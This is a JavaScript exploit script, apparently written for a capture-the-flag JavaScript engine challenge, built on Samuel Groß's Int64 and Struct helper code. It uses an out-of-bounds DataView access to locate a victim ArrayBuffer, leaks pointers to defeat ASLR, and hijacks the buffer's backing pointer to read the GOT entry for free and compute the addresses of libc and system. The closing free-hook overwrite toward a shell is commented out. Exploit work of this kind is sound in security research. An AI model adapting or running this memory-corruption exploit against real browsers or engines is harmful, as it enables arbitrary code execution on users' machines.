//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian));
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        return Struct.unpack(Struct.float64, bytes);
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 7; i >= 0; i--) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

let zero = new Int64("0000000000000000");
let find = new Int64("00000000000004d2");

let buf = new ArrayBuffer(64);
let dv = new DataView(buf);

let victim = new ArrayBuffer(1234);

describe(victim);
describe(buf);

let smash = -1;

for (var i = -0x10000; i <= 0x8000; i += 8) {
    if (dv.getFloat64(i) === find.asDouble()) {
        smash = i;
        break;
    }
}


if (smash === -1)
    console.log("[!] failed")

let victim_buf = Int64.fromDouble(dv.getFloat64(smash + 8));
let js_array_buffer_free = Int64.fromDouble(dv.getFloat64(smash + 40));
let js_array_buffer_free_off = new Int64("000000000001c310");
let pie_base = Sub(js_array_buffer_free, js_array_buffer_free_off);

console.log("[+] victim_buf " + victim_buf);
console.log("[+] js_array_buffer_free " + js_array_buffer_free);
console.log("[+] pie_base " + pie_base);

dv.setFloat64(smash + 8, pie_base.asDouble());

dvv = new DataView(victim);

let got_plt_free_off = 0xa6d18;
let libc_free_hook_off = 0xdeadbeef;
let libc_free_off = new Int64("0000000000087c70");
let libc_system_off = new Int64("0000000000047850");
let libc_free = Int64.fromDouble(dvv.getFloat64(got_plt_free_off));
let libc_base = Sub(libc_free, libc_free_off);
let libc_system = Add(libc_base, libc_system_off);

console.log("[+] free " + libc_free);
console.log("[+] libc " + libc_base);
console.log("[+] system " + libc_system);

// dv.setFloat64(smash + 8, libc_base.asDouble());
// dvv.setFloat64(libc_free_hook_off, libc_system.asDouble());

// console.log("/bin/sh");
